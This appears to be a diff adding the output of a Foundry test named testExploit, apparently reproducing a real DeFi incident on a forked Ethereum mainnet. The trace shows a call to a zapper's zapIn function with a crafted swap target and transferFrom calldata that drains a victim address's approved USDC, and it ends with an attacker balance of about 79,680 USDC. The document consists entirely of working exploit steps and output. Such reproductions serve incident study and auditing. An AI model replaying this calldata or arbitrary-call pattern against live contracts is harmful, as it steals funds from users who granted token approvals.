@@ -1,0 +1,137 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/BrahTOPG_exp.sol:ContractTest
+[PASS] testExploit() (gas: 304761)
+Logs:
+  [End] Attacker USDC balance after exploit: 79679.661825
+
+Traces:
+  [5817] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 15933794 [1.593e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [377661] ContractTest::testExploit()
+    ├─ [23731] WETH9::fallback{value: 1000000000000000}()
+    │   ├─ emit Deposit(dst: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 1000000000000000 [1e15])
+    │   ├─  storage changes:
+    │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x00000000000000000000000000000000000000000000000000038d7ea4c68000
+    │   └─ ← [Stop]
+    ├─ [24420] WETH9::approve(UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─  storage changes:
+    │   │   @ 0x466c74776b1cb1a6f02cc765a14cd3bfd6607c3d7fcc2476c94e5bc071e25f00: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   └─ ← [Return] true
+    ├─ [534] WETH9::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 1000000000000000 [1e15]
+    ├─ [87533] UniswapV2Router02::swapExactTokensForTokensSupportingFeeOnTransferTokens(1000000000000000 [1e15], 0, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x853d955aCEf822Db058eb8505911ED77F175b99e], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1668012935 [1.668e9])
+    │   ├─ [8225] WETH9::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xFD0A40Bc83C5faE4203DEc7e5929B446b07d1C76, 1000000000000000 [1e15])
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xFD0A40Bc83C5faE4203DEc7e5929B446b07d1C76, value: 1000000000000000 [1e15])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x00000000000000000000000000000000000000000000000000038d7ea4c68000 → 0
+    │   │   │   @ 0x3cc0bf2399af08f8f8add3139577bb591a488b74a3c0d2f7e7aa7bc79860fef0: 0x0000000000000000000000000000000000000000000000003700b1ac845a28fd → 0x00000000000000000000000000000000000000000000000037043f2b2920a8fd
+    │   │   └─ ← [Return] true
+    │   ├─ [2666] FRAXStablecoin::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [2504] 0xFD0A40Bc83C5faE4203DEc7e5929B446b07d1C76::getReserves() [staticcall]
+    │   │   └─ ← [Return] 4734807427443384865660 [4.734e21], 3963363026599028989 [3.963e18], 1668012119 [1.668e9]
+    │   ├─ [534] WETH9::balanceOf(0xFD0A40Bc83C5faE4203DEc7e5929B446b07d1C76) [staticcall]
+    │   │   └─ ← [Return] 3964363026599028989 [3.964e18]
+    │   ├─ [60746] 0xFD0A40Bc83C5faE4203DEc7e5929B446b07d1C76::swap(1190760418702636444 [1.19e18], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   ├─ [28223] FRAXStablecoin::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1190760418702636444 [1.19e18])
+    │   │   │   ├─ emit Transfer(from: 0xFD0A40Bc83C5faE4203DEc7e5929B446b07d1C76, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1190760418702636444 [1.19e18])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x2f81f99c1a40d802a5f3615cfad6dd321ccc5f7169f8bb60497fa0142a5b308e: 0x000000000000000000000000000000000000000000000100aca71d2cc413537c → 0x0000000000000000000000000000000000000000000001009c20aee20ab59de0
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x00000000000000000000000000000000000000000000000010866e4ab95db59c
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [666] FRAXStablecoin::balanceOf(0xFD0A40Bc83C5faE4203DEc7e5929B446b07d1C76) [staticcall]
+    │   │   │   └─ ← [Return] 4733616667024682229216 [4.733e21]
+    │   │   ├─ [534] WETH9::balanceOf(0xFD0A40Bc83C5faE4203DEc7e5929B446b07d1C76) [staticcall]
+    │   │   │   └─ ← [Return] 3964363026599028989 [3.964e18]
+    │   │   ├─ emit Sync(reserve0: 4733616667024682229216 [4.733e21], reserve1: 3964363026599028989 [3.964e18])
+    │   │   ├─ emit Swap(sender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 0, amount1In: 1000000000000000 [1e15], amount0Out: 1190760418702636444 [1.19e18], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─  storage changes:
+    │   │   │   @ 10: 0x0000000000000000000000000021d7f26fff5072e6071b5c55766838ceeb64b0 → 0x0000000000000000000000000021d8014fecbab2ae3ee09aa24dd9b828d3c370
+    │   │   │   @ 9: 0x000000000000000000000000000000007960e022b8ef3e4e754159f8dab28920 → 0x0000000000000000000000000000000079618eff011f03763fe28112119de6d0
+    │   │   │   @ 8: 0x636bd8570000000000003700b1ac845a28fd000000000100aca71d2cc413537c → 0x636bdb8700000000000037043f2b2920a8fd0000000001009c20aee20ab59de0
+    │   │   └─ ← [Stop]
+    │   ├─ [666] FRAXStablecoin::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   └─ ← [Return] 1190760418702636444 [1.19e18]
+    │   └─ ← [Stop]
+    ├─ [9815] FiatTokenProxy::fallback(0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3) [staticcall]
+    │   ├─ [2529] FiatTokenV2_1::balanceOf(0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3) [delegatecall]
+    │   │   └─ ← [Return] 79679661825 [7.967e10]
+    │   └─ ← [Return] 79679661825 [7.967e10]
+    ├─ [3426] FiatTokenProxy::fallback(0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3, 0xD248B30A3207A766d318C7A87F5Cf334A439446D) [staticcall]
+    │   ├─ [2637] FiatTokenV2_1::allowance(0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3, 0xD248B30A3207A766d318C7A87F5Cf334A439446D) [delegatecall]
+    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007903129639935 [1.157e77]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007903129639935 [1.157e77]
+    ├─ [183727] 0xD248B30A3207A766d318C7A87F5Cf334A439446D::zapIn(ZapData({ requiredToken: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, amountIn: 1, minAmountOut: 0, allowanceTarget: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, swapTarget: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, callData: 0x23b872dd000000000000000000000000a19789f57d0e0225a82eeff0fecb9f3776f276a30000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000128d472701 }))
+    │   ├─ [2404] Vault::zapper() [staticcall]
+    │   │   └─ ← [Return] 0xD248B30A3207A766d318C7A87F5Cf334A439446D
+    │   ├─ [1139] ContractTest::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xD248B30A3207A766d318C7A87F5Cf334A439446D, 1)
+    │   │   └─ ← [Return] true
+    │   ├─ [327] Vault::wantToken() [staticcall]
+    │   │   └─ ← [Return] FRAXStablecoin: [0x853d955aCEf822Db058eb8505911ED77F175b99e]
+    │   ├─ [327] Vault::wantToken() [staticcall]
+    │   │   └─ ← [Return] FRAXStablecoin: [0x853d955aCEf822Db058eb8505911ED77F175b99e]
+    │   ├─ [2666] FRAXStablecoin::balanceOf(0xD248B30A3207A766d318C7A87F5Cf334A439446D) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [674] ContractTest::balanceOf(0xD248B30A3207A766d318C7A87F5Cf334A439446D) [staticcall]
+    │   │   └─ ← [Return] 1
+    │   ├─ [25540] ContractTest::approve(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
+    │   │   ├─ [23423] FRAXStablecoin::transfer(0xD248B30A3207A766d318C7A87F5Cf334A439446D, 10)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xD248B30A3207A766d318C7A87F5Cf334A439446D, value: 10)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000000000010866e4ab95db59c → 0x00000000000000000000000000000000000000000000000010866e4ab95db592
+    │   │   │   │   @ 0x4353ec233c2f95bdc8e4a11194b8c9b41bcd07349cd13a36b1a02e77b41879cd: 0 → 10
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [41492] FiatTokenProxy::fallback(0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 79679661825 [7.967e10])
+    │   │   ├─ [40697] FiatTokenV2_1::transferFrom(0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 79679661825 [7.967e10]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: 0xA19789f57D0E0225a82EEFF0FeCb9f3776f276a3, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 79679661825 [7.967e10])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0 → 0x000000000000000000000000000000000000000000000000000000128d472701
+    │   │   │   │   @ 0x3c52fa0ed710c0d408d14c58cade9f1567ad6f99ad66ef2945f2384cb089ae73: 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffdabf41bff → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffeb1eacf4fe
+    │   │   │   │   @ 0xc3c1b20958d63e904c4ac66a19a6f708d70f2b0040a8b6a88ff5ca6693f03d8a: 0x000000000000000000000000000000000000000000000000000000128d472701 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [666] FRAXStablecoin::balanceOf(0xD248B30A3207A766d318C7A87F5Cf334A439446D) [staticcall]
+    │   │   └─ ← [Return] 10
+    │   ├─ [327] Vault::wantToken() [staticcall]
+    │   │   └─ ← [Return] FRAXStablecoin: [0x853d955aCEf822Db058eb8505911ED77F175b99e]
+    │   ├─ [24733] FRAXStablecoin::approve(Vault: [0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3], 10)
+    │   │   ├─ emit Approval(owner: 0xD248B30A3207A766d318C7A87F5Cf334A439446D, spender: Vault: [0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3], value: 10)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x095b84e4130fe94141ca73a72826d7f0d797f92766732dc954c754c7c91d4acc: 0 → 10
+    │   │   └─ ← [Return] true
+    │   ├─ [63297] Vault::deposit(10, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   ├─ [2474] SlippageAccounter::getSlippageAccountedAmount(10)
+    │   │   │   └─ ← [Return] 10
+    │   │   ├─ [2666] FRAXStablecoin::balanceOf(Vault: [0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3]) [staticcall]
+    │   │   │   └─ ← [Return] 72428494116542870975961 [7.242e22]
+    │   │   ├─ [8974] FRAXStablecoin::transferFrom(0xD248B30A3207A766d318C7A87F5Cf334A439446D, Vault: [0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3], 10)
+    │   │   │   ├─ emit Transfer(from: 0xD248B30A3207A766d318C7A87F5Cf334A439446D, to: Vault: [0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3], value: 10)
+    │   │   │   ├─ emit Approval(owner: 0xD248B30A3207A766d318C7A87F5Cf334A439446D, spender: Vault: [0xB3dA8d6Da3eDe239ccbF576cA0Eaa74D86f0e9D3], value: 0)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x4353ec233c2f95bdc8e4a11194b8c9b41bcd07349cd13a36b1a02e77b41879cd: 10 → 0
+    │   │   │   │   @ 0x9edd44108d3f06ac2d85db730dbc6eba4ff68a4e54c0f6ab212574b84ae16391: 0x000000000000000000000000000000000000000000000f565b45c8632fa7f5d9 → 0x000000000000000000000000000000000000000000000f565b45c8632fa7f5e3
+    │   │   │   │   @ 0x095b84e4130fe94141ca73a72826d7f0d797f92766732dc954c754c7c91d4acc: 10 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 9)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 9
+    │   │   │   @ 2: 0x000000000000000000000000000000000000000000000f4a88eac928fecba266 → 0x000000000000000000000000000000000000000000000f4a88eac928fecba26f
+    │   │   └─ ← [Return] 9
+    │   ├─ emit ZappedIn(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 1, param3: 9)
+    │   └─ ← [Stop]
+    ├─ [1315] FiatTokenProxy::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [529] FiatTokenV2_1::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 79679661825 [7.967e10]
+    │   └─ ← [Return] 79679661825 [7.967e10]
+    ├─ emit log_named_decimal_uint(key: "[End] Attacker USDC balance after exploit", val: 79679661825 [7.967e10], decimals: 6)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 21.04s (18.78s CPU time)
+
+Ran 1 test suite in 23.20s (21.04s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
